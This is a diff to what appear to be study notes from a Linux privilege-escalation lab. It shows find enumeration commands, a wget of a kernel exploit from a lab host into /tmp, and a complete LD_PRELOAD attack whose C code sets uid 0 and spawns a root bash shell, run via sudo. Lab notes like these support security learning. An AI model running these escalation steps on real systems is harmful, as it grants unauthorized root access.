@@ -137,10 +137,9 @@ cat /etc/passwd | grep home
 * `perm` parameter affects how `find` works.
   * `find / -perm -o x -type d 2>/dev/null` finds world-executable folders.
 * Find development tools and supported languages.
-
-`find / -name perl*`
-`find / -name python*`
-find / -name gcc*`
+  * `find / -name perl*`
+  * `find / -name python*`
+  * `find / -name gcc*`
 
 * SUID bit allows the file to run with the privilege level of the account that owns it rather than the account which runs it.
   * Allows for an interesting privilege escalation path.
@@ -213,7 +212,7 @@ wget http://10.10.166.35:9000/37392.c -P /tmp/
 ```
 ofc.c: mv ./37392.c ofc.c
 ```
-  * Compile the C source code file `ofs.c` into a binary executable file named `ofs`.
+  * Compile C source code file `ofs.c` into a binary executable file named `ofs`.
 ```
 gcc ofs.c -o ofs
 ```
@@ -252,9 +251,11 @@ uid=0(root) gid=0(root) groups=0(root),1001(karen)
 * A shared library can be generated that will be loaded and executed before the program is run if the `env_keep` option is enabled.
 * LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
 * Privilege escalation vector.
-  * Check for LD_PRELOAD (with the env_keep option).
-  * Write a simple C code compiled as a share object (.so extension) file.
-    * C code will simply spawn a root shell and can be written as follows:
+1. Check for LD_PRELOAD (with the env_keep option).
+2. Write a simple C code compiled as a share object (.so extension) file.
+   * C code will simply spawn a root shell.
+   * Save code as `shell.c`.
+
 ```
 #include <stdio.h>
 #include <sys/types.h>
@@ -266,17 +267,18 @@ setuid(0);
 system("/bin/bash");
 }
 ```
-    * Save code as `shell.c`.
-    * Compile it using gcc (GNU Compiler Collection) into a shared object file.
+  
+3. Compile it using gcc (GNU Compiler Collection) into a shared object file.
+
 ```
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 ```
-  * Run the program with sudo rights and the LD_PRELOAD option pointing to the .so file.
-    * `Apache2`, `find`, or almost any of the programs that can be run with sudo can be used.
+4. Run the program with sudo rights and the LD_PRELOAD option pointing to the .so file.
+   * `Apache2`, `find`, or almost any of the programs that can be run with sudo can be used.
 ```
 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
-* This will result in a shell spawn with root privileges.
+5. This will result in a shell spawn with root privileges.
 
 ## Privilege Escalation: SUID
 * Much of Linux privilege controls relies on controlling permissions.
